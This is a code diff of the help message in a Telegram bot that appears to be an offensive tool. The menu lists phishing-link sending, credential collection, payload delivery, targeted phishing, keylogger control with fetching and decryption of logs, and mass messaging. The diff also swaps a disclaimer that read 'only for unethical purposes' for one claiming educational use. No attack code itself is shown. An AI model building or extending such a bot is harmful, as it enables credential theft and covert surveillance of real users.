@@ -30,15 +30,20 @@ def send_help(message):
     help_text = (
         "📖 *Available Commands:*\n\n"
         "/start or /hello - Welcome message to get started.\n"
-        "/phish - Sends a phishing link .\n"
-        "/credentials - Collects username and password.\n"
+        "/phish - Sends a phishing link.\n"
+        "/credentials - Collects and displays username and password.\n"
         "/payload - Generates and sends a secure payload file (for authorized users only).\n"
+        "/target - Start phishing for a target group or username.\n"
+        "/startkeylogger - Starts the keylogger process.\n"
+        "/stopkeylogger - Stops the keylogger process.\n"
+        "/keylogs - Fetches and sends encrypted keylogs.\n"
+        "/decryptlogs - Decrypts and displays encrypted logs.\n"
         "/help - Displays this help message.\n\n"
         "💡 *Additional Features:*\n"
         "- All messages are logged for review.\n"
         "- Responses are securely forwarded to the admin.\n"
-        "- Mass messaging capability (run using Telethon).\n\n"
-        "⚠️ *Note:* Use responsibly and only for unethical purposes."
+        "- Mass messaging capability using Telethon.\n\n"
+        "⚠️ *Note:* Use responsibly and only for educational or authorized purposes."
     )
     bot.reply_to(message, help_text, parse_mode="Markdown")
 
